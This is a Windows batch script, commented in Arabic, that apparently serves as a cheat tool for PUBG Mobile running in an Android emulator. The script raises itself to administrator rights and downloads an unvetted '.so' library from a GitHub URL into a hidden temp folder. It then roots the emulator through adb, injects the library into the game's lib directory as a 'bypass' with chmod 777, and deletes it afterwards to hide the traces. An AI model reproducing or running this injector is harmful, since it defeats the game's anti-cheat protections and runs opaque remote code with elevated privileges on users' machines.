@echo off
chcp 65001 >nul

:: التأكد من الصلاحيات
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: تغيير مسار الـ redit للمسار الأضمن اللي اتفقنا عليه في الـ ++C
set "redit_file=C:\Windows\Temp\menta\redit.txt"

if not exist "%redit_file%" (
    echo ERROR: redit.txt not found!
    pause
    exit /b
)

for /f "tokens=*" %%A in ('type "%redit_file%"') do set "target_path=%%A"
set "target_path=%target_path:\\=\%"
set "target_path=%target_path:AndroidEmulatorEn.exe=adb.exe%"

for %%I in ("%target_path%") do set "target_dir=%%~dpI"
cd /d "%target_dir%" || (echo FAIL & pause & exit /b)

:: مسار تحميل الملف (الـ Temp أضمن من الـ AppData في حالة الـ System Profile)
set "hiddenPath=C:\Windows\Temp\menta"
if not exist "%hiddenPath%" mkdir "%hiddenPath%"

set "fileName=libAkAudioVisiual.so"

echo Downloading Bypass File...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/jack74512/UAO7/raw/refs/heads/main/%fileName%' -OutFile '%hiddenPath%\%fileName%'"

if not exist "%hiddenPath%\%fileName%" (
    echo ERROR: Download Failed!
    pause
    exit /b
)

adb kill-server
adb start-server
echo Launching PUBG...
adb shell monkey -p com.tencent.ig -c android.intent.category.LAUNCHer 1
timeout /t 8 >nul

adb root
adb remount
echo Injecting Bypass...
adb push "%hiddenPath%\%fileName%" /data/local/tmp/
adb shell mv /data/local/tmp/%fileName% /data/data/com.tencent.ig/lib/
:: إعطاء صلاحيات كاملة للملف عشان اللعبة تقرأه
adb shell chmod 777 /data/data/com.tencent.ig/lib/%fileName%

echo Waiting for 45 seconds (Game Loading)...
timeout /t 45 >nul

echo Cleaning up...
adb shell rm /data/data/com.tencent.ig/lib/%fileName%
if exist "%hiddenPath%\%fileName%" del "%hiddenPath%\%fileName%"

echo SUCCESS! Bypass Finished.
pause
